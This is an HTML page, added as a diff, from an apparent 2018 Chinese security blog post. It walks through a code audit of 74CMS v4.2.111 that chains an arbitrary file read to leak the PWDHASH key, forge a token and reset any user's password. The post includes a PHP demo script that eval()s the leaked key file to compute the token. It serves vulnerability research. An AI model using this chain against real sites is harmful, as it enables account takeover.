@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CMS," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="审计cms：74cms_v4.2.111漏洞原理:任意文件读取得到关键Token来修改用户密码。任意文件读取漏洞可参考笔者之前的文章:74CMS_V4.2.111一处任意文件读取附py脚本 代码分析1.在查看Home\Controller\ApiController.class.php代码时:发现编辑会员资料时可用uid修改密码 遂拿起Burp测试一波: 发现显示Token验证失败 我们跟进验证">
+<meta name="keywords" content="CMS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置">
+<meta property="og:url" content="http://yoursite.com/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/index.html">
+<meta property="og:site_name" content="P0rZ9&#39;s blog">
+<meta property="og:description" content="审计cms：74cms_v4.2.111漏洞原理:任意文件读取得到关键Token来修改用户密码。任意文件读取漏洞可参考笔者之前的文章:74CMS_V4.2.111一处任意文件读取附py脚本 代码分析1.在查看Home\Controller\ApiController.class.php代码时:发现编辑会员资料时可用uid修改密码 遂拿起Burp测试一波: 发现显示Token验证失败 我们跟进验证">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/gdusp76823b283ot2p7my7ou/image_1cpdu0m528571igq1v16eirejpp.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/e0p6ctn3i3xh1smil7qikr9d/image_1cpduafgk1ps31irv1c5h12g9f7716.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/s0rm02likekl3984br8648j0/image_1cpe4ogft18r2iof1jeidqf1n7v2m.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/a2od1lkyzvmohwm4qgqttoi3/image_1cpe4t1s01ce91irna0brlj1l2r33.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/e1c4hizaw7ro9iph3nht1cof/image_1cpe3saa8fdl6tkc2idmr10b529.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/zko0432p3ubba1cbxq8e3l9z/image_1cpe1iard1uic199ju9kueb1u4h1j.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/quwblkxx885w7i2eylbn5g12/image_1cpe1lksk20k5mfq9b1u5vvre20.png">
+<meta property="og:updated_time" content="2018-10-10T05:54:50.380Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置">
+<meta name="twitter:description" content="审计cms：74cms_v4.2.111漏洞原理:任意文件读取得到关键Token来修改用户密码。任意文件读取漏洞可参考笔者之前的文章:74CMS_V4.2.111一处任意文件读取附py脚本 代码分析1.在查看Home\Controller\ApiController.class.php代码时:发现编辑会员资料时可用uid修改密码 遂拿起Burp测试一波: 发现显示Token验证失败 我们跟进验证">
+<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/"/>
+
+
+
+
+
+  <title>代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置 | P0rZ9's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">P0rZ9's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/10/74CMS_V4.2.111任意文件读取到任意密码重置/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">代码审计 | 74CMS_V4.2.111任意文件读取到任意密码重置</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-10T09:15:41+08:00">
+                2018-10-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<p>审计cms：<a href="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" target="_blank" rel="noopener">74cms_v4.2.111</a><br>漏洞原理:任意文件读取得到关键Token来修改用户密码。<br>任意文件读取漏洞可参考笔者之前的文章:<a href="https://p0rz9.github.io/2018/10/09/74CMS_V4.2.111%E4%B8%80%E5%A4%84%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E9%99%84py%E8%84%9A%E6%9C%AC/" target="_blank" rel="noopener">74CMS_V4.2.111一处任意文件读取附py脚本</a></p>
+<p><strong>代码分析</strong><br>1.在查看<code>Home\Controller\ApiController.class.php</code>代码时:<br>发现编辑会员资料时可用<code>uid</code>修改密码<br><img src="http://static.zybuluo.com/chhyx/jnsrp4ki483xp9oi2ryenh2z/image_1cpe26mdq14po5331v8a1gik1132d.png" alt="image_1cpe26mdq14po5331v8a1gik1132d.png-60.4kB"></p>
+<p>遂拿起Burp测试一波:<br><img src="http://static.zybuluo.com/chhyx/gdusp76823b283ot2p7my7ou/image_1cpdu0m528571igq1v16eirejpp.png" alt="image_1cpdu0m528571igq1v16eirejpp.png-84.1kB"></p>
+<p>发现显示Token验证失败 我们跟进验证token的函数<code>check_token()</code>:<br><img src="http://static.zybuluo.com/chhyx/e0p6ctn3i3xh1smil7qikr9d/image_1cpduafgk1ps31irv1c5h12g9f7716.png" alt="image_1cpduafgk1ps31irv1c5h12g9f7716.png-57.2kB"></p>
+<p>我们要想通过<code>token</code>验证 需要满足这个条件:</p>
+<pre><code>(decrypt($token,C(&apos;PWDHASH&apos;))==C(&apos;PWDHASH&apos;))
+</code></pre><p>2.跟进<code>decrypt()</code>,发现这是一个解密函数,参数为源字符串与密钥:</p>
+<pre><code>function decrypt($txt, $key = &apos;_qscms&apos;) {//token  C
+// $txt 的结果为加密后的字串经过 base64 解码，然后与私有密匙一起，
+// 经过 passport_key() 函数处理后的返回值
+$txt = passport_key(base64_decode($txt), $key);
+// 变量初始化
+$tmp = &apos;&apos;;
+// for 循环，$i 为从 0 开始，到小于 $txt 字串长度的整数
+for ($i = 0; $i &lt; strlen($txt); $i++) {
+    // $tmp 字串在末尾增加一位，其内容为 $txt 的第 $i 位，
+    // 与 $txt 的第 $i + 1 位取异或。然后 $i = $i + 1
+    $tmp .= $txt[$i] ^ $txt[++$i];
+}
+// 返回 $tmp 的值作为结果
+return $tmp;
+</code></pre><p>}</p>
+<p>分析代码可得到正确的token值为<code>C(&#39;PWDHASH&#39;)</code>与密钥<code>C(&#39;PWDHASH&#39;)</code>经过<code>encrypt()</code>加密得到的字符串。</p>
+<p>我们先测试下如果拿到正确Token可不可以成功修改密码:<br><img src="http://static.zybuluo.com/chhyx/s0rm02likekl3984br8648j0/image_1cpe4ogft18r2iof1jeidqf1n7v2m.png" alt="image_1cpe4ogft18r2iof1jeidqf1n7v2m.png-89.3kB"></p>
+<p>去Burp测试:<br><img src="http://static.zybuluo.com/chhyx/a2od1lkyzvmohwm4qgqttoi3/image_1cpe4t1s01ce91irna0brlj1l2r33.png" alt="image_1cpe4t1s01ce91irna0brlj1l2r33.png-97.4kB"></p>
+<p>可看到修改成功。</p>
+<p>3.那现在的问题转化为如何去获取密钥<code>C(&#39;PWDHASH&#39;)</code><br>因为这个值是系统定义好的,那我们就可以利用昨天审出的文件读取来得到密钥,我们搜索下定义密钥的文件,得到<code>pwdhash.php</code>。</p>
+<p>4.现在利用漏洞就很简单了</p>
+<pre><code>python脚本获取含有密钥的jpg文件--&gt;PHP利用密钥进行加密,得到token--&gt;用得到的token修改用户密码
+</code></pre><p><strong>漏洞利用</strong><br>1.通过任意文件读取<br><code>upload\Application\Common\Conf\pwdhash.php</code>文件,得到一个包含pwdhash值的jpg文件</p>
+<p><img src="http://static.zybuluo.com/chhyx/e1c4hizaw7ro9iph3nht1cof/image_1cpe3saa8fdl6tkc2idmr10b529.png" alt="image_1cpe3saa8fdl6tkc2idmr10b529.png-76.1kB"></p>
+<p>2.我们本地加密得到<code>token</code>:</p>
+<pre><code>#demo.php
+&lt;?php
+
+function get_token($pwdhash){
+    $token = encrypt($pwdhash,$pwdhash);
+    var_dump($token);
+
+}
+function encrypt($txt, $key = &apos;_qscms&apos;) {
+    ...
+}
+function passport_key($txt, $encrypt_key) {
+   ...
+}
+
+$file_name = &apos;http://127.0.0.1:84/data/upload/avatar/1810/10/76162f0285d10193b1d79ceff9653d1c.jpg&apos;;
+$data = eval(str_replace(&apos;&lt;?php&apos;, &apos;&apos;, file_get_contents($file_name)));
+get_token($data[&apos;PWDHASH&apos;]);
+?&gt;
+</code></pre><p>得到Token<br><img src="http://static.zybuluo.com/chhyx/zko0432p3ubba1cbxq8e3l9z/image_1cpe1iard1uic199ju9kueb1u4h1j.png" alt="image_1cpe1iard1uic199ju9kueb1u4h1j.png-111.9kB"></p>
+<p>3.用得到的token修改密码:<br><img src="http://static.zybuluo.com/chhyx/quwblkxx885w7i2eylbn5g12/image_1cpe1lksk20k5mfq9b1u5vvre20.png" alt="image_1cpe1lksk20k5mfq9b1u5vvre20.png-103.6kB"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CMS/" rel="tag"># CMS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/09/74CMS_V4.2.111一处任意文件读取附py脚本/" rel="next" title="代码审计 | 74CMS_V4.2.111一处任意文件读取附py脚本">
+                <i class="fa fa-chevron-left"></i> 代码审计 | 74CMS_V4.2.111一处任意文件读取附py脚本
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/12/PHP基础知识/" rel="prev" title="基础知识 | PHP基础知识">
+                基础知识 | PHP基础知识 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">P0rZ9</p>
+              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">37</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">P0rZ9</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
